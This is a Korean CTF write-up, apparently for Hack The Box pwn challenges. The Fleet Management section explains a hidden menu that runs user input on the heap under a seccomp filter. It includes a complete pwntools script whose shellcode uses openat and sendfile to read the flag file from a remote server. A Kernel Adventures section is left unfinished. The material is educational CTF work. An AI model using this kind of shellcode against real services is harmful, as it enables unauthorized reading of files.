## 8. Fleet Management - easy (20pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled%2039.png)

바이너리 파일이 주어진다.

### 풀이 과정

보호 기법은 다음과 같다.

![Untitled](/assets/images/htb/pwn/Untitled%2040.png)

프로그램 기능을 먼저 간단히 살펴보았다.

1. 디스크립션과 menu를 출력한다. 총 4개의 메뉴가 존재한다.
2. 각각의 메뉴 중에 4번은 exit시키는 기능이고, 1, 2, 3번은 디스크립션 출력시키는 의미없는 함수이다.

**취약점 탐색**

메뉴에 출력된 숫자 외에 9를 입력하면 다른 메뉴가 존재한다.

beta_feature 함수를 호출한다. 이 함수 내부에서는 mprotect 함수로 (동적할당 받은 주소 & 0xFFFFFFFFFFFFF000)에 60바이트 만큼 rwx 권한을 받아오고, skid_check 함수 내부에서 seccomp filter를 사용한다. 이후, read 함수를 통해 입력을 받은 버퍼를 호출한다.

동적할당 받은 주소 & 0xFFFFFFFFFFFFF000는 결국 heapbase를 의미한다. 또한, mprotect 함수는 0x1000 바이트 단위로 page단위로 할당되기 때문에 60을 넣어도 0x1000 만큼 rwx 권한이 생기는 것을 알 수 있다.

![Untitled](/assets/images/htb/pwn/Untitled%2041.png)

문제는 쉘코드 작성이다. 먼저 seccomp filter가 어떻게 작동하는지 살펴보았다.

![Untitled](/assets/images/htb/pwn/Untitled%2042.png)

1. syscall 번호가 일단 0x40000000 보다 작아야한다. 32bit로 우회하는 것이 막혔다.
2. rt_sigreturn, sendfile, exit, exit_group, openat 을 제외한 syscall 번호는 다 막혔다.

sigreturn을 사용하기에는 복구 레지스터를 저장할 스택에 내가 원하는 데이터를 저장할 수 없다. (쉘코드는 heap에 저장되므로…)

생각하고 있는 익스플로잇 방식은 openat syscall 을 이용해 ./flag.txt 를 읽고 리턴되는 파일 디스크립션을 가져와서 sendfile syscall의 인자로 사용한다. sendfile syscall을 사용하면 디스크립션간의 데이터를 전달해서, 결과적으로 stdout 디스크립터에 출력시키면 flag를 획득할 수 있을 것이다. 

위의 내용을 그대로 쉘코드를 제작해서 보내면 flag를 획득할 수 있다.

**페이로드**

```python
from pwn import *

r = remote('157.245.41.248', 31193)
#r = process('fleet_management')

context.arch = 'amd64'

r.sendafter(b'do? ', b'9')

sc = '''
//openat(AT_FDCWD, './flag.txt', O_RONLY) 
  push 0x007478
  movabs rax, 0x742e67616c662f2e
  push rax
  mov rsi, rsp
  push -100
  pop rdi
  xor rdx, rdx
  push 257
  pop rax
  syscall
//sendfile(stdout, flag_fd, 0, 0x100)
  mov rsi, rax
  push 1
  pop rdi
  push 0
  pop rdx
  push 0x100
  pop rcx
  push 40
  pop rax
  syscall

'''

payload = b''
payload += asm(sc)

print("len : " + str(len(payload)))

#gdb.attach(r, 'b*beta_feature+76\nc')

r.send(payload)

print(disasm(payload))

r.interactive()
```

로컬에서는 1글자만 나왔지만, 서버에서는 플래그가 잘 출력되었다. 아직까지 이유는 잘 모르겠다.

생각해보면 쉬운데 rt_sigreturn syscall 을 왜 허용해 놓았는지 의문이다.

### 플래그 획득

![Untitled](/assets/images/htb/pwn/Untitled%2043.png)

## 9. Kernel Adventures: Part 1 - medium (50pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled%2044.png)

커널 이미지 파일이 주어진다.

난이도가 갑자기 상승했다. user rating을 보면 엄청 어려운 것을 볼 수 있다 ㄷㄷ..

### 풀이 과정

커널 어렵당.. 커널은 처음이라 커널 공부중...
이 문제는 상당히 커널 공부를 해봐야할 듯..ㅠㅠ

### 플래그 획득